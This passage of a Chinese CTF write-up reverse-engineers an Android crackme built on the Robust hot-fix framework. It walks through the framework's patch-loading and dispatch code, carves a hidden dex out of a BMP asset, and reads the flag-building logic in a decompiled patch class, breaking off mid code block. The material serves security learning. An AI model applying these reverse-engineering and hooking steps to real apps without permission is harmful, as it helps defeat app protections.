Log.e(&quot;robust&quot;, &quot;PatchsInfoImpl failed,cause of&quot; + t.toString());</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        if (patchesInfo &#x3D;&#x3D; null) &#123;</span><br><span class="line">            robustCallBack.logNotify(&quot;patchesInfo is null, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:114&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;classes need to patch</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;获取要打补丁的类patchedClasses </span><br><span class="line">        List&lt;PatchedClassInfo&gt; patchedClasses &#x3D; patchesInfo.getPatchedClassesInfo();</span><br><span class="line">        if (null &#x3D;&#x3D; patchedClasses || patchedClasses.isEmpty()) &#123;</span><br><span class="line">            robustCallBack.logNotify(&quot;patchedClasses is null or empty, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:122&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">          &#x2F;&#x2F;循环类名，将patchedClasses中的类打补丁</span><br><span class="line">        for (PatchedClassInfo patchedClassInfo : patchedClasses) &#123;</span><br><span class="line">            String patchedClassName &#x3D; patchedClassInfo.patchedClassName;</span><br><span class="line">            String patchClassName &#x3D; patchedClassInfo.patchClassName;</span><br><span class="line">            if (TextUtils.isEmpty(patchedClassName) || TextUtils.isEmpty(patchClassName)) &#123;</span><br><span class="line">                robustCallBack.logNotify(&quot;patchedClasses or patchClassName is empty, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:131&quot;);</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName);</span><br><span class="line">            try &#123;</span><br><span class="line">            &#x2F;&#x2F;将oldClass的changeQuickRedirectField的值设置为null</span><br><span class="line">                oldClass &#x3D; classLoader.loadClass(patchedClassName.trim());</span><br><span class="line">                Field[] fields &#x3D; oldClass.getDeclaredFields();</span><br><span class="line">                Log.d(&quot;robust&quot;, &quot;oldClass :&quot; + oldClass + &quot;     fields &quot; + fields.length);</span><br><span class="line">                Field changeQuickRedirectField &#x3D; null;</span><br><span class="line">                for (Field field : fields) &#123;</span><br><span class="line">                    if (TextUtils.equals(field.getType().getCanonicalName(), ChangeQuickRedirect.class.getCanonicalName()) &amp;&amp; TextUtils.equals(field.getDeclaringClass().getCanonicalName(), oldClass.getCanonicalName())) &#123;</span><br><span class="line">                        changeQuickRedirectField &#x3D; field;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                if (changeQuickRedirectField &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    robustCallBack.logNotify(&quot;changeQuickRedirectField  is null, patch info:&quot; + &quot;id &#x3D; &quot; + patch.getName() + &quot;,md5 &#x3D; &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:147&quot;);</span><br><span class="line">                    Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName + &quot; something wrong !! can  not find:ChangeQuickRedirect in&quot; + patchClassName);</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName + &quot; find:ChangeQuickRedirect &quot; + patchClassName);</span><br><span class="line">                try &#123;</span><br><span class="line">             &#x2F;&#x2F;动态加载补丁类</span><br><span class="line">                    patchClass &#x3D; classLoader.loadClass(patchClassName);</span><br><span class="line">                    Object patchObject &#x3D; patchClass.newInstance();</span><br><span class="line">                    changeQuickRedirectField.setAccessible(true);</span><br><span class="line">             &#x2F;&#x2F;将它的changeQuickRedirectField设置为patchObject实例。</span><br><span class="line">                    changeQuickRedirectField.set(null, patchObject);</span><br><span class="line">                    Log.d(&quot;robust&quot;, &quot;changeQuickRedirectField set sucess &quot; + patchClassName);</span><br><span class="line">                &#125; catch (Throwable t) &#123;</span><br><span class="line">                    Log.e(&quot;robust&quot;, &quot;patch failed! &quot;);</span><br><span class="line">                    t.printStackTrace();</span><br><span class="line">                    robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:163&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Throwable t) &#123;</span><br><span class="line">                Log.e(&quot;robust&quot;, &quot;patch failed! &quot;);</span><br><span class="line">                t.printStackTrace();</span><br><span class="line">                robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:169&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(&quot;robust&quot;, &quot;patch finished &quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="4-isSupport和accessDispatch"><a href="#4-isSupport和accessDispatch" class="headerlink" title="4.isSupport和accessDispatch"></a>4.isSupport和accessDispatch</h3><p>我们再来看看onCreate()中的代码，虽然混淆后代码看起来很冗长，但是通过刚刚对Robust原理的简单分析，现在已经可以清晰的知道，这其实就是isSupport()和accessDispatch()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public void onCreate(Bundle arg13) &#123;</span><br><span class="line">        int v4 &#x3D; 3;</span><br><span class="line">        Object[] v0 &#x3D; new Object[1];</span><br><span class="line">        v0[0] &#x3D; arg13;</span><br><span class="line">        ChangeQuickRedirect v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">        Class[] v5 &#x3D; new Class[1];</span><br><span class="line">        Class v1 &#x3D; Bundle.class;</span><br><span class="line">        v5[0] &#x3D; v1;</span><br><span class="line">        Class v6 &#x3D; Void.TYPE;</span><br><span class="line">        MainActivity v1_1 &#x3D; this;</span><br><span class="line">        boolean v0_1 &#x3D; PatchProxy.isSupport(v0, v1_1, v2, false, v4, v5, v6);</span><br><span class="line">        if(v0_1) &#123;</span><br><span class="line">            v0 &#x3D; new Object[1];</span><br><span class="line">            v0[0] &#x3D; arg13;</span><br><span class="line">            v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">            v5 &#x3D; new Class[1];</span><br><span class="line">            v1 &#x3D; Bundle.class;</span><br><span class="line">            v5[0] &#x3D; v1;</span><br><span class="line">            v6 &#x3D; Void.TYPE;</span><br><span class="line">            v1_1 &#x3D; this;</span><br><span class="line">            PatchProxy.accessDispatch(v0, v1_1, v2, false, v4, v5, v6);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line"> </span><br><span class="line">           .....</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105185712828.png" alt="image-20210105185712828"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public static boolean isSupport(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) &#123;</span><br><span class="line">        &#x2F;&#x2F;Robust补丁优先执行，其他功能靠后</span><br><span class="line">        if (changeQuickRedirect &#x3D;&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F;不执行补丁，轮询其他监听者</span><br><span class="line">            if (registerExtensionList &#x3D;&#x3D; null || registerExtensionList.isEmpty()) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            for (RobustExtension robustExtension : registerExtensionList) &#123;</span><br><span class="line">                if (robustExtension.isSupport(new RobustArguments(paramsArray, current, isStatic, methodNumber, paramsClassTypes, returnType))) &#123;</span><br><span class="line">                    robustExtensionThreadLocal.set(robustExtension);</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;获取 classMethod &#x3D; className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber;</span><br><span class="line">        String classMethod &#x3D; getClassMethod(isStatic, methodNumber);</span><br><span class="line">        if (TextUtils.isEmpty(classMethod)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        Object[] objects &#x3D; getObjects(paramsArray, current, isStatic);</span><br><span class="line">        try &#123;</span><br><span class="line">        &#x2F;*调用changeQuickRedirect.isSupport，还记得这个changeQuickRedirect</span><br><span class="line">        吗，他是在第3步中changeQuickRedirectField.set(null, patchObject);</span><br><span class="line">        得到的补丁类的实例。*&#x2F;</span><br><span class="line">            return changeQuickRedirect.isSupport(classMethod, objects);</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上面的分析，可以知道只有当存在补丁的类changeQuickRedirect.isSupport()才会返回值。这个时候我们把刚刚第二步打包的dex反编译看看，我们可以看到在xxxPatchControl类中存在isSupport，它返回的值其实就是methodNumber。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public boolean isSupport(String methodName, Object[] paramArrayOfObject) &#123;</span><br><span class="line">        return &quot;18:&quot;.contains(methodName.split(&quot;:&quot;)[3]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>accessDispatch()方法，替换原方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public static Object accessDispatch(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) &#123;</span><br><span class="line"> </span><br><span class="line">       &#x2F;&#x2F;如果changeQuickRedirect为null...</span><br><span class="line">        if (changeQuickRedirect &#x3D;&#x3D; null) &#123;</span><br><span class="line">            RobustExtension robustExtension &#x3D; robustExtensionThreadLocal.get();</span><br><span class="line">            robustExtensionThreadLocal.remove();</span><br><span class="line">            if (robustExtension !&#x3D; null) &#123;</span><br><span class="line">                notify(robustExtension.describeSelfFunction());</span><br><span class="line">                return robustExtension.accessDispatch(new RobustArguments(paramsArray, current, isStatic, methodNumber, paramsClassTypes, returnType));</span><br><span class="line">            &#125;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;同样获取 classMethod &#x3D; className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber;</span><br><span class="line">        String classMethod &#x3D; getClassMethod(isStatic, methodNumber);</span><br><span class="line">        if (TextUtils.isEmpty(classMethod)) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        notify(Constants.PATCH_EXECUTE);</span><br><span class="line"> </span><br><span class="line">        Object[] objects &#x3D; getObjects(paramsArray, current, isStatic);</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;返回changeQuickRedirect.accessDispatch。</span><br><span class="line">        return changeQuickRedirect.accessDispatch(classMethod, objects);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>具体看看PatchControl类中的accessDispatch。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public Object accessDispatch(String methodName, Object[] paramArrayOfObject) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        MainActivityPatch mainActivityPatch;</span><br><span class="line">        &#x2F;&#x2F;判断classMethod的isStatic是否为false，其实在调用accessDispatch传递的就是false。</span><br><span class="line">        if (methodName.split(&quot;:&quot;)[2].equals(&quot;false&quot;)) &#123;</span><br><span class="line">            MainActivityPatch mainActivityPatch2;</span><br><span class="line">            if (keyToValueRelation.get(paramArrayOfObject[paramArrayOfObject.length - 1]) &#x3D;&#x3D; null) &#123;</span><br><span class="line">                mainActivityPatch2 &#x3D; new MainActivityPatch(paramArrayOfObject[paramArrayOfObject.length - 1]);</span><br><span class="line">                keyToValueRelation.put(paramArrayOfObject[paramArrayOfObject.length - 1], null);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                mainActivityPatch2 &#x3D; (MainActivityPatch) keyToValueRelation.get(paramArrayOfObject[paramArrayOfObject.length - 1]);</span><br><span class="line">            &#125;</span><br><span class="line">            mainActivityPatch &#x3D; mainActivityPatch2;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            mainActivityPatch &#x3D; new MainActivityPatch(null);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;根据methodNumber，选取要执行的patch方法。</span><br><span class="line">        Object obj &#x3D; methodName.split(&quot;:&quot;)[3];</span><br><span class="line">        if (&quot;3&quot;.equals(obj)) &#123;</span><br><span class="line">            mainActivityPatch.onCreate((Bundle) paramArrayOfObject[0]);</span><br><span class="line">        &#125;</span><br><span class="line">        if (&quot;6&quot;.equals(obj)) &#123;</span><br><span class="line">            return mainActivityPatch.Joseph(((Integer) paramArrayOfObject[0]).intValue(), ((Integer) paramArrayOfObject[1]).intValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Throwable th) &#123;</span><br><span class="line">        th.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Robust的基本原理就是这些了</p><h2 id="hook点分析"><a href="#hook点分析" class="headerlink" title="hook点分析"></a>hook点分析</h2><p>我们对Robust进行分析，现在已经比较清晰的知道了我们需要攻克的难点，它是通过Robust热修复框架将一些方法热修复了，所以我们这里必须知道，它修复了哪些类及方法。</p><p>foremost提取assets文件夹下的GeekTan.BMP，得到dex文件直接扔到jadx中进行分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">─$ foremost GeekTan.BMP</span><br><span class="line">foremost: &#x2F;usr&#x2F;local&#x2F;etc&#x2F;foremost.conf: No such file or directory</span><br><span class="line">Processing: GeekTan.BMP</span><br><span class="line">|foundat&#x3D;classes.dex�,�dex</span><br><span class="line">035</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>在PatchesInfoImpl类中可以看到2个要被修复的类信息。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105190528663.png" alt="image-20210105190528663"></p><p>MainActivityPatchControl类，我们看到在accessDispatch()，onCreate()和Joseph()方法将会通过判断ethodNumber来选取。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105190724026.png" alt="image-20210105190724026"></p><p>继续查看MainActivity$1PatchControl类，同样发现onClick被修复了。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105190859996.png" alt="image-20210105190859996"></p><p>所以这个时候，我们必须知道onClick真正执行的逻辑是什么。查看MainActivity$1Patch类中的真正的onClick方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">package cn.chaitin.geektan.crackme;</span><br><span class="line"></span><br><span class="line">import android.content.Context;</span><br><span class="line">import android.text.Editable;</span><br><span class="line">import android.text.TextUtils;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.widget.EditText;</span><br><span class="line">import android.widget.Toast;</span><br><span class="line">import cn.chaitin.geektan.crackme.MainActivity;</span><br><span class="line">import com.meituan.robust.patch.RobustModify;</span><br><span class="line">import com.meituan.robust.utils.EnhancedRobustUtils;</span><br><span class="line"></span><br><span class="line">public class MainActivity$1Patch &#123;</span><br><span class="line">    MainActivity.1 originClass;</span><br><span class="line"></span><br><span class="line">    public MainActivity$1Patch(Object obj) &#123;</span><br><span class="line">        this.originClass &#x3D; (MainActivity.1) obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object[] getRealParameter(Object[] objArr) &#123;</span><br><span class="line">        if (objArr &#x3D;&#x3D; null || objArr.length &lt; 1) &#123;</span><br><span class="line">            return objArr;</span><br><span class="line">        &#125;</span><br><span class="line">        Object[] objArr2 &#x3D; new Object[objArr.length];</span><br><span class="line">        for (int i &#x3D; 0; i &lt; objArr.length; i++) &#123;</span><br><span class="line">            if (objArr[i] &#x3D;&#x3D; this) &#123;</span><br><span class="line">                objArr2[i] &#x3D; this.originClass;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                objArr2[i] &#x3D; objArr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return objArr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onClick(View view) &#123;</span><br><span class="line">        MainActivity$1Patch mainActivity$1Patch;</span><br><span class="line">        EnhancedRobustUtils.invokeReflectStaticMethod(&quot;modify&quot;, RobustModify.class, getRealParameter(new Object[0]), (Class[]) null);</span><br><span class="line">        MainActivity.1 r0 &#x3D; (EditText) EnhancedRobustUtils.getFieldValue(&quot;val$input_text&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">        if (r0 &#x3D;&#x3D; this) &#123;</span><br><span class="line">            r0 &#x3D; ((MainActivity$1Patch) r0).originClass;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!((Boolean) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;isEmpty&quot;, TextUtils.class, getRealParameter(new Object[]&#123;(Editable) EnhancedRobustUtils.invokeReflectMethod(&quot;getText&quot;, r0, new Object[0], (Class[]) null, EditText.class)&#125;), new Class[]&#123;CharSequence.class&#125;)).booleanValue()) &#123;</span><br><span class="line">            MainActivity.1 r02 &#x3D; (EditText) EnhancedRobustUtils.getFieldValue(&quot;val$input_text&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">            if (r02 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r02 &#x3D; ((MainActivity$1Patch) r02).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r03 &#x3D; (Editable) EnhancedRobustUtils.invokeReflectMethod(&quot;getText&quot;, r02, new Object[0], (Class[]) null, EditText.class);</span><br><span class="line">            if (r03 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r03 &#x3D; ((MainActivity$1Patch) r03).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r04 &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;toString&quot;, r03, new Object[0], (Class[]) null, Object.class);</span><br><span class="line">            MainActivity.1 r1 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectConstruct(&quot;java.lang.StringBuilder&quot;, new Object[0], (Class[]) null);</span><br><span class="line">            if (r1 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r1 &#x3D; ((MainActivity$1Patch) r1).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r12 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r1, getRealParameter(new Object[]&#123;&quot;DDCTF&#123;&quot;&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            MainActivity.1 r2 &#x3D; (MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">            if (r2 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r2 &#x3D; ((MainActivity$1Patch) r2).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            String str &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, r2, getRealParameter(new Object[]&#123;new Integer(5), new Integer(6)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">            if (r12 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r12 &#x3D; ((MainActivity$1Patch) r12).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r13 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r12, getRealParameter(new Object[]&#123;str&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            MainActivity.1 r22 &#x3D; (MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">            if (r22 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r22 &#x3D; ((MainActivity$1Patch) r22).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            String str2 &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, r22, getRealParameter(new Object[]&#123;new Integer(7), new Integer(8)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">            if (r13 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r13 &#x3D; ((MainActivity$1Patch) r13).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r14 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r13, getRealParameter(new Object[]&#123;str2&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            if (r14 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r14 &#x3D; ((MainActivity$1Patch) r14).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r15 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r14, getRealParameter(new Object[]&#123;&quot;&#125;&quot;&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            if (r15 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r15 &#x3D; ((MainActivity$1Patch) r15).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            String str3 &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;toString&quot;, r15, new Object[0], (Class[]) null, StringBuilder.class);</span><br><span class="line">            if (r04 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r04 &#x3D; ((MainActivity$1Patch) r04).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            if (((Boolean) EnhancedRobustUtils.invokeReflectMethod(&quot;equals&quot;, r04, getRealParameter(new Object[]&#123;str3&#125;), new Class[]&#123;Object.class&#125;, String.class)).booleanValue()) &#123;</span><br><span class="line">                if (this instanceof MainActivity$1Patch) &#123;</span><br><span class="line">                    mainActivity$1Patch &#x3D; this.originClass;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    mainActivity$1Patch &#x3D; this;</span><br><span class="line">                &#125;</span><br><span class="line">                MainActivity.1 r05 &#x3D; (Toast) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;makeText&quot;, Toast.class, getRealParameter(new Object[]&#123;(MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, mainActivity$1Patch, MainActivity.1.class), &quot;恭喜大佬！密码正确！&quot;, new Integer(0)&#125;), new Class[]&#123;Context.class, CharSequence.class, Integer.TYPE&#125;);</span><br><span class="line">                if (r05 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                    r05 &#x3D; ((MainActivity$1Patch) r05).originClass;</span><br><span class="line">                &#125;</span><br><span class="line">                EnhancedRobustUtils.invokeReflectMethod(&quot;show&quot;, r05, new Object[0], (Class[]) null, Toast.class);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        MainActivity.1 r06 &#x3D; (Toast) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;makeText&quot;, Toast.class, getRealParameter(new Object[]&#123;(MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class), &quot;大佬莫急！再试试！&quot;, new Integer(0)&#125;), new Class[]&#123;Context.class, CharSequence.class, Integer.TYPE&#125;);</span><br><span class="line">        if (r06 &#x3D;&#x3D; this) &#123;</span><br><span class="line">            r06 &#x3D; ((MainActivity$1Patch) r06).originClass;</span><br><span class="line">        &#125;</span><br><span class="line">        EnhancedRobustUtils.invokeReflectMethod(&quot;show&quot;, r06, new Object[0], (Class[]) null, Toast.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析onClick方法，可以发现很多<code>invokeReflectStaticMethod</code>，<code>getFieldValue</code>，<code>invokeReflectMethod</code>方法，同样我们还能发现flag就在这里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 